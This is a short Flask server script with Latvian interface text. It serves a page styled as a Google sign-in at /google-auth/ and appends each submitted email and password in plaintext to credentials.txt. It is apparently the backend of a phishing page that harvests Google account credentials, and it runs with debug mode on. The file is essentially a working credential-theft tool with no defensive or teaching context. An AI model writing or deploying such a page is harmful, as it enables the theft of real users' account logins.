from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return "Sveiks! Šis ir mans Flask serveris."

@app.route('/google-auth/', methods=['GET'])
def google_auth_page():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def save_credentials():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return render_template('google-auth.html', error="Lūdzu ievadi e-pastu un paroli.")

    with open('credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"Email: {email}, Password: {password}\n")

    return render_template('google-auth.html', message="Dati saglabāti!")

if __name__ == '__main__':
    app.run(port=5000, debug=True)
